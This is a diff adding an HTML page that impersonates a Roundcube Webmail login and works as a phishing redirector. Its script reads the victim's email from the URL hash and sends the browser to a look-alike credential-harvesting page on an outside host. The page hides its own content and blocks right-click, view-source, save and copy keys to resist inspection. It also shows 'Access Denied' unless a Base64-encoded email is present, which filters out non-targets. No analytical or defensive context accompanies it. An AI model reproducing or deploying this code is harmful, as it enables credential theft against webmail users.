@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      html {
+        visibility: hidden;
+        background: white;
+      }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script
+      src="https://code.jquery.com/jquery-3.3.1.js"
+      integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
+      crossorigin="anonymous"
+    ></script>
+    <link
+      rel="shortcut icon"
+      href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317"
+    />
+    <title>Roundcube Webmail</title>
+
+    <script>
+      var data = getParameter();
+      var redir_to_page =
+        "https://webmail-authb.xuanzhenge.com/2096/cpsess4599328678/roundcube/user-validation" +
+        data +
+        "";
+      var hash = window.location.hash;
+      var email = hash.split("#")[1];
+      redir_to_page = redir_to_page + email;
+      window.location = redir_to_page;
+      function getParameter() {
+        var listof = ["#"];
+        var listCount = listof.length;
+        var randomNum = listCount - 1;
+        randomNum = Math.floor(Math.random() * randomNum);
+        var result = listof[randomNum];
+
+        return result;
+      }
+    </script>
+    <script>
+      $(document).bind("keydown", function (e) {
+        if (e.ctrlKey && e.which == 83) {
+          e.preventDefault();
+          return false;
+        }
+      });
+      document.addEventListener("contextmenu", (event) =>
+        event.preventDefault()
+      );
+      document.onkeydown = function (e) {
+        if (
+          e.ctrlKey &&
+          (e.keyCode === 67 ||
+            e.keyCode === 86 ||
+            e.keyCode === 85 ||
+            e.keyCode === 117)
+        ) {
+          return false;
+        } else {
+          return true;
+        }
+      };
+      $(document).keypress("u", function (e) {
+        if (e.ctrlKey) {
+          return false;
+        } else {
+          return true;
+        }
+      });
+
+      document.addEventListener("DOMContentLoaded", function () {
+        function isValidBase64Email(encodedString) {
+          try {
+            let decoded = atob(encodedString);
+            let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(decoded) ? decoded : null;
+          } catch (e) {
+            return null;
+          }
+        }
+
+        function enforceAccessRestriction() {
+          let hash = window.location.hash.substring(1);
+
+          let decodedEmail = isValidBase64Email(hash);
+          if (!decodedEmail) {
+            document.body.innerHTML = "";
+            document.body.style.cssText = `
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                flex-direction: column;
+                text-align: center;
+                background-color: white;
+                color: black;
+                font-family: Arial, sans-serif;
+                margin: 0;
+            `;
+            let deniedMessage = document.createElement("div");
+            deniedMessage.innerHTML = `
+                <h1 style="color: red;">Access Denied</h1>
+                <p>You must include a valid Base64-encoded email in the URL hash.</p>
+            `;
+            document.body.appendChild(deniedMessage);
+            return;
+          }
+          console.log("Decoded Email:", decodedEmail);
+        }
+        enforceAccessRestriction();
+      });
+    </script>
+  </head>
+</html>
